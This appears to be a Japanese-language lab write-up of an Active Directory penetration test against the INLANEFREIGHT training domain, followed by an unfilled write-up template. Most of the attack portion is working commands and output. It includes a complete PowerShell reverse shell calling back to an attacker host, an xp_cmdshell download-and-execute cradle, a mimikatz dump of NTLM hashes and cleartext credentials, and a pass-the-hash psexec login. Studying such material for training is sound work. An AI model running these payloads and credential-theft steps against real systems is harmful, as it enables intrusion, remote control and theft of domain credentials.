Account Name: BR086, Authority Name: INLANEFREIGHT
```

### 得られた認証情報
BR086 : Welcome1

# SQL01サーバーへの侵入・権限昇格
## Enumeration
- 得られた認証情報を使って、それぞれのsmbにアクセスする
```sh
┌─[htb-student@skills-par01]─[~]
└──╼ $sudo crackmapexec smb 172.16.7.50 -u BR086 -p Welcome1 --shares
SMB         172.16.7.50     445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.7.50     445    MS01             [+] INLANEFREIGHT.LOCAL\BR086:Welcome1 
SMB         172.16.7.50     445    MS01             [+] Enumerated shares
SMB         172.16.7.50     445    MS01             Share           Permissions     Remark
SMB         172.16.7.50     445    MS01             -----           -----------     ------
SMB         172.16.7.50     445    MS01             ADMIN$                          Remote Admin
SMB         172.16.7.50     445    MS01             C$                              Default share
SMB         172.16.7.50     445    MS01             IPC$            READ            Remote IPC
┌─[htb-student@skills-par01]─[~]
└──╼ $sudo crackmapexec smb 172.16.7.60 -u BR086 -p Welcome1 --shares
SMB         172.16.7.60     445    SQL01            [*] Windows 10.0 Build 17763 x64 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.7.60     445    SQL01            [+] INLANEFREIGHT.LOCAL\BR086:Welcome1 
SMB         172.16.7.60     445    SQL01            [+] Enumerated shares
SMB         172.16.7.60     445    SQL01            Share           Permissions     Remark
SMB         172.16.7.60     445    SQL01            -----           -----------     ------
SMB         172.16.7.60     445    SQL01            ADMIN$                          Remote Admin
SMB         172.16.7.60     445    SQL01            C$                              Default share
SMB         172.16.7.60     445    SQL01            IPC$            READ            Remote IPC
┌─[htb-student@skills-par01]─[~]
└──╼ $sudo crackmapexec smb 172.16.7.3 -u BR086 -p Welcome1 --shares
SMB         172.16.7.3      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.7.3      445    DC01             [+] INLANEFREIGHT.LOCAL\BR086:Welcome1 
SMB         172.16.7.3      445    DC01             [+] Enumerated shares
SMB         172.16.7.3      445    DC01             Share           Permissions     Remark
SMB         172.16.7.3      445    DC01             -----           -----------     ------
SMB         172.16.7.3      445    DC01             ADMIN$                          Remote Admin
SMB         172.16.7.3      445    DC01             C$                              Default share
SMB         172.16.7.3      445    DC01             Department Shares READ            Share for department users
SMB         172.16.7.3      445    DC01             IPC$            READ            Remote IPC
SMB         172.16.7.3      445    DC01             NETLOGON        READ            Logon server share 
SMB         172.16.7.3      445    DC01             SYSVOL          READ            Logon server share 
```
- 上のコマンドの結果、MS01、SQL01のホストでは特に権限がないが、DC01の中の「Department Shares」を見ることできる

- 以下にweb.configがある
```sh
smb: \IT\Private\Development\> ls
  .                                   D        0  Fri Apr  1 11:04:07 2022
  ..                                  D        0  Fri Apr  1 11:04:07 2022
  web.config                          A     1203  Fri Apr  1 11:04:05 2022
smb: \IT\Private\Development\> get web.config
```

- web.configの中にMSSQLの認証情報が書いてある
	- SQL01サーバーのMSSQLにログインできるかも？
```sh
<SNIP>     
  </masterDataServices>  
       <connectionStrings>
           <add name="ConString" connectionString="Environment.GetEnvironmentVariable("computername")+'\SQLEXPRESS';Initial Catalog=Northwind;User ID=netdb;Password=D@ta_bAse_adm1n!"/>
       </connectionStrings>
<SNIP>
```

### 得られた認証情報
netdb : D@ta_bAse_adm1n!

## Exploit
- 得られた認証情報でアクセスする
```sh
└──╼ $mssqlclient.py netdb@172.16.7.60
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> 
```

-　SQLサーバーの中で、権限確認（sysadminかチェック）とOSコマンドが実行可能か(xp_cmdshell)を確認する
```sh
SQL> SELECT SYSTEM_USER;
--------------------------------------------------------------------------------------------------------------------------------   
netdb                                                                                                                              
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');
-----------   
          1   
SQL> EXEC xp_cmdshell 'whoami';
output                                                                                                                                         
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
nt service\mssql$sqlexpress                                                                                                                   
NULL                                                                                                                                           
```
確認した結果、sysadmin権限を持っているし、whoamiコマンドも実行できることを確認した。

### リバースシェル
リバースシェルの作成
```sh
nano rev.ps1

$client = New-Object System.Net.Sockets.TCPClient("172.16.7.240",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
```

172.16.240でリスナーの起動
```sh
nc -lvnp 4444
```

ダウンロード実行
```sh
SQL> EXEC xp_cmdshell 'powershell -Command "IEX(New-Object Net.WebClient).DownloadString(\"http://172.16.7.240:8080/rev.ps1\")"';
SQL> EXEC xp_cmdshell 'C:\Windows\Temp\ps.exe -i -c "powershell -ep bypass -nop -w hidden -f C:\Users\Public\rev.ps1"';
```

リスナーでシェルが立ち上がる
```sh
PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> 

```

フラグの取得
```sh
PS C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.txt
s3imp3rs0nate_cl@ssic
PS C:\Windows\system32> 
```

# MS01での権限昇格
SQL01サーバーで得られた認証情報ではログインできない
```sh
┌─[✗]─[htb-student@skills-par01]─[~]
└──╼ $crackmapexec smb 172.16.7.50 -u netdb -p 'D@ta_bAse_adm1n!' --loggedon-users
SMB         172.16.7.50     445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.7.50     445    MS01             [-] INLANEFREIGHT.LOCAL\netdb:D@ta_bAse_adm1n! STATUS_LOGON_FAILURE 
┌─[htb-student@skills-par01]─[~]
└──╼ $crackmapexec winrm 172.16.7.50 -u netdb -p 'D@ta_bAse_adm1n!'
WINRM       172.16.7.50     5985   NONE             [*] None (name:172.16.7.50) (domain:None)
WINRM       172.16.7.50     5985   NONE             [*] http://172.16.7.50:5985/wsman
WINRM       172.16.7.50     5985   NONE             [-] None\netdb:D@ta_bAse_adm1n!
┌─[htb-student@skills-par01]─[~]
└──╼ $evil-winrm -i 172.16.7.50 -u netdb -p 'D@ta_bAse_adm1n!'
Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
Error: Exiting with code 1
┌─[✗]─[htb-student@skills-par01]─[~]
└──╼ $ldapsearch -h 172.16.7.50 -D 'INLANEFREIGHT\netdb' -w 'D@ta_bAse_adm1n!' -b "DC=INLANEFREIGHT,DC=LOCAL"
ldap_sasl_bind(SIMPLE): Can't contact LDAP server (-1)
┌─[✗]─[htb-student@skills-par01]─[~]
└──╼ $rpcclient -U "netdb%D@ta_bAse_adm1n!" 172.16.7.50
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
┌─[✗]─[htb-student@skills-par01]─[~]
└──╼ $smbmap -H 172.16.7.50 -u netdb -p 'D@ta_bAse_adm1n!'
[!] Authentication error on 172.16.7.50
┌─[htb-student@skills-par01]─[~]
└──╼ $impacket-getTGT INLANEFREIGHT/netdb:'D@ta_bAse_adm1n!' -dc-ip 172.16.7.3
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)

```


## SQL01でのmimikatz実行
今、SQL01には管理者権限が取れてるので、mimikatzが実行できる
```sh
PS C:\Users\Administrator\Documents\mimikatz\mimikatz-master\x64> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 213329 (00000000:00034151)
Session           : Interactive from 1
User Name         : mssqlsvc
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 4/9/2025 12:30:45 AM
SID               : S-1-5-21-3327542485-274640656-2609762496-4613
	msv :	
	 [00000003] Primary
	 * Username : mssqlsvc
	 * Domain   : INLANEFREIGHT
	 * NTLM     : 8c9555327d95f815987c0d81238c7660
	 * SHA1     : 0a8d7e8141b816c8b20b4762da5b4ee7038b515c
	 * DPAPI    : a1568414db09f65c238b7557bc3ceeb8
	tspkg :	
	wdigest :	
	 * Username : mssqlsvc
	 * Domain   : INLANEFREIGHT
	 * Password : (null)
	kerberos :	
	 * Username : mssqlsvc
	 * Domain   : INLANEFREIGHT.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 71634 (00000000:000117d2)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/9/2025 12:30:32 AM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : SQL01$
	 * Domain   : INLANEFREIGHT
	 * NTLM     : 6991907663e3f68922d24ac9a573e2c3
	 * SHA1     : 33058b24d5882f1dd18ce81988aa64226e2879b5
	tspkg :	
	wdigest :	
	 * Username : SQL01$
	 * Domain   : INLANEFREIGHT
	 * Password : (null)
	kerberos :	
	 * Username : SQL01$
	 * Domain   : INLANEFREIGHT.LOCAL
	 * Password : ;6bu^ur;mJ&ES&#Iu)CQZeckLZsyN >AgIv4DZ^&EX,Wu.ahRkT%c3)R+c&xcu_:]n#V1V.j[=+GTjk?l)z OaU8!c^\#`s?8/E!xy^itE>kYiBcSgohVb$P
	ssp :	
	credman :	

Authentication Id : 0 ; 41879 (00000000:0000a397)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/9/2025 12:30:32 AM
SID               : S-1-5-96-0-0
	msv :	
	 [00000003] Primary
	 * Username : SQL01$
	 * Domain   : INLANEFREIGHT
	 * NTLM     : 82e1dcc812b1f7ec09b661f22dde155f
	 * SHA1     : dc27ff74864a06312d31c800a1edb654f1ae6737
	tspkg :	
	wdigest :	
	 * Username : SQL01$
	 * Domain   : INLANEFREIGHT
	 * Password : (null)
	kerberos :	
	 * Username : SQL01$
	 * Domain   : INLANEFREIGHT.LOCAL
	 * Password : 33 80 5f 87 5c ad 12 c5 5c be 13 00 a7 72 dd cf 75 2c 10 f1 aa 56 5e bc de 36 1a b2 46 bd 17 2d 9d 42 96 ad ad b7 cd 5f b5 0a 6f 07 b4 59 60 5a 0c d9 42 ab 90 4a 01 9f 55 02 de 09 9d 00 cc 37 66 e5 99 48 4f a8 92 b3 6d c3 c0 90 06 89 72 71 6d 5e 40 27 50 be 80 5d bf 3b fb e6 5f c6 50 42 eb 97 16 e3 2a 4c bd 9a 24 f8 6b af 2f ca 77 59 2e 12 8c b5 75 5c 8e 98 03 d4 22 c3 83 0d 87 35 3b 2d 86 0d d7 fc 53 22 b3 c3 55 d3 e8 7e 16 37 d4 b1 ce 63 be 6a be 07 a7 c9 ef 84 71 db 24 4a 6a e6 e5 2c b6 52 fb 35 aa d9 06 97 2a ec e5 09 48 68 60 83 a7 4c 6f ee 7b 1b 6a 7c c9 8d 3a a5 ce bf 94 5c 13 b0 9c 86 39 79 3d ed 92 84 11 72 fb b8 79 5c 20 57 f2 83 2d 66 69 17 40 53 b2 f8 55 10 e0 b2 18 13 41 58 24 ac e1 d6 e9 d2 5e b0 
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : SQL01$
Domain            : INLANEFREIGHT
Logon Server      : (null)
Logon Time        : 4/9/2025 12:30:31 AM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : SQL01$
	 * Domain   : INLANEFREIGHT
	 * Password : (null)
	kerberos :	
	 * Username : sql01$
	 * Domain   : INLANEFREIGHT.LOCAL
	 * Password : 33 80 5f 87 5c ad 12 c5 5c be 13 00 a7 72 dd cf 75 2c 10 f1 aa 56 5e bc de 36 1a b2 46 bd 17 2d 9d 42 96 ad ad b7 cd 5f b5 0a 6f 07 b4 59 60 5a 0c d9 42 ab 90 4a 01 9f 55 02 de 09 9d 00 cc 37 66 e5 99 48 4f a8 92 b3 6d c3 c0 90 06 89 72 71 6d 5e 40 27 50 be 80 5d bf 3b fb e6 5f c6 50 42 eb 97 16 e3 2a 4c bd 9a 24 f8 6b af 2f ca 77 59 2e 12 8c b5 75 5c 8e 98 03 d4 22 c3 83 0d 87 35 3b 2d 86 0d d7 fc 53 22 b3 c3 55 d3 e8 7e 16 37 d4 b1 ce 63 be 6a be 07 a7 c9 ef 84 71 db 24 4a 6a e6 e5 2c b6 52 fb 35 aa d9 06 97 2a ec e5 09 48 68 60 83 a7 4c 6f ee 7b 1b 6a 7c c9 8d 3a a5 ce bf 94 5c 13 b0 9c 86 39 79 3d ed 92 84 11 72 fb b8 79 5c 20 57 f2 83 2d 66 69 17 40 53 b2 f8 55 10 e0 b2 18 13 41 58 24 ac e1 d6 e9 d2 5e b0 
	ssp :	
	credman :	

Authentication Id : 0 ; 118492 (00000000:0001cedc)
Session           : Service from 0
User Name         : SQLTELEMETRY$SQLEXPRESS
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 4/9/2025 12:30:34 AM
SID               : S-1-5-80-1985561900-798682989-2213159822-1904180398-3434236965
	msv :	
	 [00000003] Primary
	 * Username : SQL01$
	 * Domain   : INLANEFREIGHT
	 * NTLM     : 82e1dcc812b1f7ec09b661f22dde155f
	 * SHA1     : dc27ff74864a06312d31c800a1edb654f1ae6737
	tspkg :	
	wdigest :	
	 * Username : SQL01$
	 * Domain   : INLANEFREIGHT
	 * Password : (null)
	kerberos :	
	 * Username : SQL01$
	 * Domain   : INLANEFREIGHT.LOCAL
	 * Password : 33 80 5f 87 5c ad 12 c5 5c be 13 00 a7 72 dd cf 75 2c 10 f1 aa 56 5e bc de 36 1a b2 46 bd 17 2d 9d 42 96 ad ad b7 cd 5f b5 0a 6f 07 b4 59 60 5a 0c d9 42 ab 90 4a 01 9f 55 02 de 09 9d 00 cc 37 66 e5 99 48 4f a8 92 b3 6d c3 c0 90 06 89 72 71 6d 5e 40 27 50 be 80 5d bf 3b fb e6 5f c6 50 42 eb 97 16 e3 2a 4c bd 9a 24 f8 6b af 2f ca 77 59 2e 12 8c b5 75 5c 8e 98 03 d4 22 c3 83 0d 87 35 3b 2d 86 0d d7 fc 53 22 b3 c3 55 d3 e8 7e 16 37 d4 b1 ce 63 be 6a be 07 a7 c9 ef 84 71 db 24 4a 6a e6 e5 2c b6 52 fb 35 aa d9 06 97 2a ec e5 09 48 68 60 83 a7 4c 6f ee 7b 1b 6a 7c c9 8d 3a a5 ce bf 94 5c 13 b0 9c 86 39 79 3d ed 92 84 11 72 fb b8 79 5c 20 57 f2 83 2d 66 69 17 40 53 b2 f8 55 10 e0 b2 18 13 41 58 24 ac e1 d6 e9 d2 5e b0 
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SQL01$
Domain            : INLANEFREIGHT
Logon Server      : (null)
Logon Time        : 4/9/2025 12:30:32 AM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : SQL01$
	 * Domain   : INLANEFREIGHT
	 * NTLM     : 82e1dcc812b1f7ec09b661f22dde155f
	 * SHA1     : dc27ff74864a06312d31c800a1edb654f1ae6737
	tspkg :	
	wdigest :	
	 * Username : SQL01$
	 * Domain   : INLANEFREIGHT
	 * Password : (null)
	kerberos :	
	 * Username : sql01$
	 * Domain   : INLANEFREIGHT.LOCAL
	 * Password : 33 80 5f 87 5c ad 12 c5 5c be 13 00 a7 72 dd cf 75 2c 10 f1 aa 56 5e bc de 36 1a b2 46 bd 17 2d 9d 42 96 ad ad b7 cd 5f b5 0a 6f 07 b4 59 60 5a 0c d9 42 ab 90 4a 01 9f 55 02 de 09 9d 00 cc 37 66 e5 99 48 4f a8 92 b3 6d c3 c0 90 06 89 72 71 6d 5e 40 27 50 be 80 5d bf 3b fb e6 5f c6 50 42 eb 97 16 e3 2a 4c bd 9a 24 f8 6b af 2f ca 77 59 2e 12 8c b5 75 5c 8e 98 03 d4 22 c3 83 0d 87 35 3b 2d 86 0d d7 fc 53 22 b3 c3 55 d3 e8 7e 16 37 d4 b1 ce 63 be 6a be 07 a7 c9 ef 84 71 db 24 4a 6a e6 e5 2c b6 52 fb 35 aa d9 06 97 2a ec e5 09 48 68 60 83 a7 4c 6f ee 7b 1b 6a 7c c9 8d 3a a5 ce bf 94 5c 13 b0 9c 86 39 79 3d ed 92 84 11 72 fb b8 79 5c 20 57 f2 83 2d 66 69 17 40 53 b2 f8 55 10 e0 b2 18 13 41 58 24 ac e1 d6 e9 d2 5e b0 
	ssp :	
	credman :	

Authentication Id : 0 ; 41872 (00000000:0000a390)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/9/2025 12:30:32 AM
SID               : S-1-5-96-0-1
	msv :	
	 [00000003] Primary
	 * Username : SQL01$
	 * Domain   : INLANEFREIGHT
	 * NTLM     : 82e1dcc812b1f7ec09b661f22dde155f
	 * SHA1     : dc27ff74864a06312d31c800a1edb654f1ae6737
	tspkg :	
	wdigest :	
	 * Username : SQL01$
	 * Domain   : INLANEFREIGHT
	 * Password : (null)
	kerberos :	
	 * Username : SQL01$
	 * Domain   : INLANEFREIGHT.LOCAL
	 * Password : 33 80 5f 87 5c ad 12 c5 5c be 13 00 a7 72 dd cf 75 2c 10 f1 aa 56 5e bc de 36 1a b2 46 bd 17 2d 9d 42 96 ad ad b7 cd 5f b5 0a 6f 07 b4 59 60 5a 0c d9 42 ab 90 4a 01 9f 55 02 de 09 9d 00 cc 37 66 e5 99 48 4f a8 92 b3 6d c3 c0 90 06 89 72 71 6d 5e 40 27 50 be 80 5d bf 3b fb e6 5f c6 50 42 eb 97 16 e3 2a 4c bd 9a 24 f8 6b af 2f ca 77 59 2e 12 8c b5 75 5c 8e 98 03 d4 22 c3 83 0d 87 35 3b 2d 86 0d d7 fc 53 22 b3 c3 55 d3 e8 7e 16 37 d4 b1 ce 63 be 6a be 07 a7 c9 ef 84 71 db 24 4a 6a e6 e5 2c b6 52 fb 35 aa d9 06 97 2a ec e5 09 48 68 60 83 a7 4c 6f ee 7b 1b 6a 7c c9 8d 3a a5 ce bf 94 5c 13 b0 9c 86 39 79 3d ed 92 84 11 72 fb b8 79 5c 20 57 f2 83 2d 66 69 17 40 53 b2 f8 55 10 e0 b2 18 13 41 58 24 ac e1 d6 e9 d2 5e b0 
	ssp :	
	credman :	

Authentication Id : 0 ; 119015 (00000000:0001d0e7)
Session           : Service from 0
User Name         : MSSQL$SQLEXPRESS
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 4/9/2025 12:30:34 AM
SID               : S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133
	msv :	
	 [00000003] Primary
	 * Username : SQL01$
	 * Domain   : INLANEFREIGHT
	 * NTLM     : 82e1dcc812b1f7ec09b661f22dde155f
	 * SHA1     : dc27ff74864a06312d31c800a1edb654f1ae6737
	tspkg :	
	wdigest :	
	 * Username : SQL01$
	 * Domain   : INLANEFREIGHT
	 * Password : (null)
	kerberos :	
	 * Username : SQL01$
	 * Domain   : INLANEFREIGHT.LOCAL
	 * Password : 33 80 5f 87 5c ad 12 c5 5c be 13 00 a7 72 dd cf 75 2c 10 f1 aa 56 5e bc de 36 1a b2 46 bd 17 2d 9d 42 96 ad ad b7 cd 5f b5 0a 6f 07 b4 59 60 5a 0c d9 42 ab 90 4a 01 9f 55 02 de 09 9d 00 cc 37 66 e5 99 48 4f a8 92 b3 6d c3 c0 90 06 89 72 71 6d 5e 40 27 50 be 80 5d bf 3b fb e6 5f c6 50 42 eb 97 16 e3 2a 4c bd 9a 24 f8 6b af 2f ca 77 59 2e 12 8c b5 75 5c 8e 98 03 d4 22 c3 83 0d 87 35 3b 2d 86 0d d7 fc 53 22 b3 c3 55 d3 e8 7e 16 37 d4 b1 ce 63 be 6a be 07 a7 c9 ef 84 71 db 24 4a 6a e6 e5 2c b6 52 fb 35 aa d9 06 97 2a ec e5 09 48 68 60 83 a7 4c 6f ee 7b 1b 6a 7c c9 8d 3a a5 ce bf 94 5c 13 b0 9c 86 39 79 3d ed 92 84 11 72 fb b8 79 5c 20 57 f2 83 2d 66 69 17 40 53 b2 f8 55 10 e0 b2 18 13 41 58 24 ac e1 d6 e9 d2 5e b0 
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/9/2025 12:30:32 AM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 71616 (00000000:000117c0)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/9/2025 12:30:32 AM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : SQL01$
	 * Domain   : INLANEFREIGHT
	 * NTLM     : 82e1dcc812b1f7ec09b661f22dde155f
	 * SHA1     : dc27ff74864a06312d31c800a1edb654f1ae6737
	tspkg :	
	wdigest :	
	 * Username : SQL01$
	 * Domain   : INLANEFREIGHT
	 * Password : (null)
	kerberos :	
	 * Username : SQL01$
	 * Domain   : INLANEFREIGHT.LOCAL
	 * Password : 33 80 5f 87 5c ad 12 c5 5c be 13 00 a7 72 dd cf 75 2c 10 f1 aa 56 5e bc de 36 1a b2 46 bd 17 2d 9d 42 96 ad ad b7 cd 5f b5 0a 6f 07 b4 59 60 5a 0c d9 42 ab 90 4a 01 9f 55 02 de 09 9d 00 cc 37 66 e5 99 48 4f a8 92 b3 6d c3 c0 90 06 89 72 71 6d 5e 40 27 50 be 80 5d bf 3b fb e6 5f c6 50 42 eb 97 16 e3 2a 4c bd 9a 24 f8 6b af 2f ca 77 59 2e 12 8c b5 75 5c 8e 98 03 d4 22 c3 83 0d 87 35 3b 2d 86 0d d7 fc 53 22 b3 c3 55 d3 e8 7e 16 37 d4 b1 ce 63 be 6a be 07 a7 c9 ef 84 71 db 24 4a 6a e6 e5 2c b6 52 fb 35 aa d9 06 97 2a ec e5 09 48 68 60 83 a7 4c 6f ee 7b 1b 6a 7c c9 8d 3a a5 ce bf 94 5c 13 b0 9c 86 39 79 3d ed 92 84 11 72 fb b8 79 5c 20 57 f2 83 2d 66 69 17 40 53 b2 f8 55 10 e0 b2 18 13 41 58 24 ac e1 d6 e9 d2 5e b0 
	ssp :	
	credman :	

Authentication Id : 0 ; 40789 (00000000:00009f55)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 4/9/2025 12:30:32 AM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : SQL01$
	 * Domain   : INLANEFREIGHT
	 * NTLM     : 82e1dcc812b1f7ec09b661f22dde155f
	 * SHA1     : dc27ff74864a06312d31c800a1edb654f1ae6737
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

mimikatz(commandline) # exit
Bye!

```

### 得られた認証情報
ユーザーネーム : mssqlsvc
NTLMハッシュ   : 8c9555327d95f815987c0d81238c7660

## Pass-the-Hash で MS01 にログイン
```sh
┌─[htb-student@skills-par01]─[~]
└──╼ $psexec.py INLANEFREIGHT/mssqlsvc@172.16.7.50 -hashes :8c9555327d95f815987c0d81238c7660
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 172.16.7.50.....
[*] Found writable share ADMIN$
[*] Uploading file pwiOJLTU.exe
[*] Opening SVCManager on 172.16.7.50.....
[*] Creating service JkWJ on 172.16.7.50.....
[*] Starting service JkWJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>hostname
MS01

C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt
exc3ss1ve_adm1n_r1ights!

C:\Windows\system32>powershell

```


### ドメイン管理者グループに対するGenericAll権限を持つユーザーの資格情報を取得
```sh
PS C:\Windows\system32> Import-Module C:\Users\AB920\Documents\PowerView.ps1
PS C:\Windows\system32> Get-DomainObjectAcl -ResolveGUIDs -Identity "CN=Domain Admins,CN=Users,DC=inlanefreight,DC=local" | Where-Object { $_.ActiveDirectoryRights -like "*GenericAll*" }
Get-DomainObjectAcl -ResolveGUIDs -Identity "CN=Domain Admins,CN=Users,DC=inlanefreight,DC=local" | Where-Object { $_.ActiveDirectoryRights -like "*GenericAll*" }


AceType               : AccessAllowed
ObjectDN              : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-3327542485-274640656-2609762496-512
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-3327542485-274640656-2609762496-4611
AccessMask            : 983551
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed

AceType               : AccessAllowed
ObjectDN              : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-3327542485-274640656-2609762496-512
InheritanceFlags      : None
BinaryLength          : 20
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-18
AccessMask            : 983551
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed


PS C:\Windows\system32>$objUser = $objSID.Translate([System.Security.Principal.NTAccount])
PS C:\Windows\system32>$objUser.Value
INLANEFREIGHT\CT059
PS C:\Windows\system32> 

```

---

# Foothold
<最初の侵入ポイントをここに書いてください>
```bash

```

```bash

```

```bash

```

```bash

```

```bash

```




- **Tactics**:
    - #Tactic_初期アクセス
    - #Tactic_Escution_実行
- **Techniques**:
    - #T1190_公開アプリケーションのエクスプロイト
    - #T1059_コマンドとスクリプトインタープリタ
    - #T1078_有効なアカウント
    - その他のInitial Access/Execution関連技術...



---

# Lateral Movement
<横方向の動きに関する説明をここに書いてください>
```bash

```

```bash

```

```bash

```

```bash

```

```bash

```



- **Tactics**:
    - #Tactic_横移動
- **Techniques**:
    - #T1021_リモートサービス
    - #T1078_有効なアカウント




---

# Privilege Escalation
<特権昇格の詳細をここに記載してください>
```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```



- **Tactics**:
    - #Tactic_特権昇格
- **Techniques**:
    - #T1068_特権昇格のためのエクスプロイト
    - #T1055_プロセス注入
    - #T1053_スケジュールされたタスク/ジョブ
    - その他のPrivilege Escalation関連技術...



---

## Notes

- **Tactics**:
    - #Tactic_永続化
    - #Tactic_防御回避
- **Techniques**:
    - #T1098_アカウント操作
    - #T1553_信頼制御の転覆
    - #T1070_ホスト上の痕跡削除
    - その他のPersistence/Defense Evasion関連技術...

<このWriteupで特に重要な点や学んだことを追加で記載するセクション>

---
## Flags

- **User**: `<md5>`
- **Root**: `<md5>`
---

### ポイント


- 簡単なポイントあった